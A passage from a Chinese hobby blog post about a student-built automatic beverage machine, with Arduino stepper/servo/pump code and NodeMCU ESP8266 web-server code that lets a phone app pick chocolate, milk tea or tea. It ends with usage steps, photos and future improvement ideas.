class="string">&lt;Servo.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STEPS 200 <span class="comment">//定義步進馬達每圈的步數</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WATER 24 <span class="comment">//抽水馬達腳位</span></span></span><br><span class="line"><span class="comment">//steps:代表馬達轉完一圈需要多少步數。如果馬達上有標示每步的度數，</span></span><br><span class="line"><span class="comment">//將360除以這個角度，就可以得到所需要的步數(例如：360/3.6=100)。</span></span><br><span class="line">Stepper <span class="title function_">Y</span><span class="params">(STEPS, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>)</span>;</span><br><span class="line">Stepper <span class="title function_">X</span><span class="params">(STEPS, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>)</span>;</span><br><span class="line">Servo goal;</span><br><span class="line"><span class="type">int</span> pos;</span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> goal.attach(<span class="number">12</span>);</span><br><span class="line"> goal.write(<span class="number">0</span>);</span><br><span class="line"> X.setSpeed(<span class="number">160</span>); <span class="comment">// 將馬達的速度設定成140RPM 最大 150~160</span></span><br><span class="line"> Y.setSpeed(<span class="number">160</span>); <span class="comment">// 電壓7.5V</span></span><br><span class="line"> pinMode(WATER,OUTPUT);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// Y.step(17000);//+向內 - 向外 //可可:17000 //奶茶: 17000 //茶:無</span></span><br><span class="line"> delay(<span class="number">500</span>);</span><br><span class="line"> X.step(<span class="number">-24000</span>);<span class="comment">//向內 //可可:-7500 //奶茶:-20000 //茶: -20000</span></span><br><span class="line"> delay(<span class="number">1000</span>);</span><br><span class="line"> <span class="keyword">for</span> (pos = <span class="number">0</span>; pos &lt;= <span class="number">120</span>; pos += <span class="number">1</span>) &#123; <span class="comment">//可可:140 //奶茶: 40 //茶:120</span></span><br><span class="line"> goal.write(pos); </span><br><span class="line"> delay(<span class="number">15</span>); </span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">for</span> (pos = <span class="number">120</span>; pos &gt;= <span class="number">0</span>; pos -= <span class="number">1</span>) &#123; </span><br><span class="line"> goal.write(pos); </span><br><span class="line"> delay(<span class="number">15</span>); </span><br><span class="line"> &#125;</span><br><span class="line"> delay(<span class="number">1000</span>);</span><br><span class="line"> X.step(<span class="number">22000</span>); </span><br><span class="line"> <span class="comment">// delay(500);</span></span><br><span class="line"> <span class="comment">// Y.step(-17000);</span></span><br><span class="line"> delay(<span class="number">1000</span>);</span><br><span class="line"> digitalWrite(WATER, HIGH);</span><br><span class="line"> delay(<span class="number">5000</span>);</span><br><span class="line"> digitalWrite(WATER, LOW);</span><br><span class="line"> delay(<span class="number">5000</span>);</span><br><span class="line"><span class="comment">//while(1) &#123; &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果想要取後排的飲料，就必須，先移動Y軸到後排再移動X軸到定點，接著servo motor轉動取料，再移動X軸至原位，Y軸移至起始位置加水，最後啟動抽水馬達則完畢。</p><blockquote><p>程式必須根據容器擺放位置，和原料出料時間，抽水量多寡來調整delay時間，且前排不需要移動Y軸。</p></blockquote><p>NodeMCU 程式碼:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> RELAY1 D7 <span class="comment">//CHOOCLATE</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RELAY2 D8 <span class="comment">// COFFEE</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RELAY3 D5 <span class="comment">// Tea</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ESP8266WiFi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WiFiClient.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ESP8266WebServer.h&gt;</span></span></span><br><span class="line">String command; <span class="comment">//String to store app command state.</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* ssid = <span class="string">&quot;專題&quot;</span>;</span><br><span class="line">ESP8266WebServer <span class="title function_">server</span><span class="params">(<span class="number">80</span>)</span>;</span><br><span class="line"><span class="type">int</span> counter = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span> &#123;</span><br><span class="line">pinMode(RELAY1, OUTPUT);</span><br><span class="line"> pinMode(RELAY2, OUTPUT);</span><br><span class="line"> pinMode(RELAY3, OUTPUT);</span><br><span class="line">Serial.begin(<span class="number">115200</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Connecting WiFi</span></span><br><span class="line">WiFi.mode(WIFI_AP);</span><br><span class="line"> WiFi.softAP(ssid);</span><br><span class="line">IPAddress myIP = WiFi.softAPIP();</span><br><span class="line"> Serial.print(<span class="string">&quot;AP IP address: &quot;</span>);</span><br><span class="line"> Serial.println(myIP);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// Starting WEB-server </span></span><br><span class="line"> server.on ( <span class="string">&quot;/&quot;</span>, HTTP_handleRoot );</span><br><span class="line"> server.onNotFound ( HTTP_handleRoot );</span><br><span class="line"> server.begin(); </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//巧克力</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">relay1</span><span class="params">()</span>&#123;</span><br><span class="line"> delay(<span class="number">1000</span>);</span><br><span class="line"> digitalWrite(RELAY1,HIGH);</span><br><span class="line"> delay(<span class="number">180000</span>);</span><br><span class="line"> digitalWrite(RELAY1,LOW);</span><br><span class="line"> delay(<span class="number">5000</span>);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">//奶茶或咖啡</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">relay2</span><span class="params">()</span>&#123;</span><br><span class="line"> delay(<span class="number">1000</span>);</span><br><span class="line"> digitalWrite(RELAY2,HIGH);</span><br><span class="line"> delay(<span class="number">180000</span>);</span><br><span class="line"> digitalWrite(RELAY2,LOW);</span><br><span class="line"> delay(<span class="number">5000</span>);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">//茶</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">relay3</span><span class="params">()</span>&#123;</span><br><span class="line"> delay(<span class="number">1000</span>);</span><br><span class="line"> digitalWrite(RELAY3,HIGH);</span><br><span class="line"> delay(<span class="number">145000</span>);</span><br><span class="line"> digitalWrite(RELAY3,LOW);</span><br><span class="line"> delay(<span class="number">5000</span>);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span> &#123;</span><br><span class="line"> server.handleClient();</span><br><span class="line"> </span><br><span class="line"> command = server.arg(<span class="string">&quot;State&quot;</span>); <span class="comment">//只有手機改變state，下面command才會變</span></span><br><span class="line"> </span><br><span class="line"> <span class="keyword">if</span> (command == <span class="string">&quot;L&quot;</span>) &#123;</span><br><span class="line"> relay1(); <span class="comment">/*chocoltae*/</span></span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (command == <span class="string">&quot;R&quot;</span>) &#123;</span><br><span class="line"> relay2(); <span class="comment">/*milk tea */</span></span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (command == <span class="string">&quot;I&quot;</span>)&#123;</span><br><span class="line"> relay3(); <span class="comment">/*tea*/</span> </span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (command == <span class="string">&quot;F&quot;</span>)&#123;</span><br><span class="line"> counter ++;</span><br><span class="line"> Serial.println(counter);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">HTTP_handleRoot</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="keyword">if</span>( server.hasArg(<span class="string">&quot;State&quot;</span>) )&#123;</span><br><span class="line"> Serial.println(server.arg(<span class="string">&quot;State&quot;</span>));</span><br><span class="line"> &#125;</span><br><span class="line"> server.send ( <span class="number">200</span>, <span class="string">&quot;text/html&quot;</span>, <span class="string">&quot;&quot;</span> );</span><br><span class="line"> delay(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>手機端</p><blockquote><p>當時不會寫手機App :(，因此用簡單的MIT AppInventor 來製作</p></blockquote><p><img src="https://i.imgur.com/3QvP8RH.png"><br><img src="https://i.imgur.com/qefwDHP.png"><br><img src="https://i.imgur.com/sZfOMW0.png"></p><h2 id="實際操作"><a href="#實際操作" class="headerlink" title="實際操作"></a>實際操作</h2><ol><li>容器填料</li><li>裝水容器加水</li><li>power supply on</li><li>手機連到Wifi AP</li><li>開啟 APP選擇想喝的飲料</li><li>等待機器完成</li></ol><p><em>整體圖</em><br><img src="https://i.imgur.com/UOlH6Vp.jpg"></p><p><em>還有LED跑馬燈</em><br><img src="https://i.imgur.com/a51d2x3.jpg"></p><h2 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h2><p>此專題有很多可以改進的地方，不論是器材的選購以及馬達的穩定度<br>雖然Arduino真的很簡單，但只要點子夠多還是發展無窮。</p><h2 id="未來發展"><a href="#未來發展" class="headerlink" title="未來發展"></a>未來發展</h2><ul><li>上方原料罐可設計成可拆卸式</li><li>可以設計攪拌模組(直流馬達配冰棒棍之類的XD)</li><li>防水設計</li><li>APP 改用 Android Studio 設計，比較多彈性</li><li>直接選購結合 ESP8266和繼電器的模組(後來才知道有這東西)</li><li>語音辨識，不用APP</li><li>加熱器：可同時冷、熱水沖泡</li></ul>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Arduino </tag>
            
            <tag> IOT </tag>
            
            <tag> NodeMCU </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
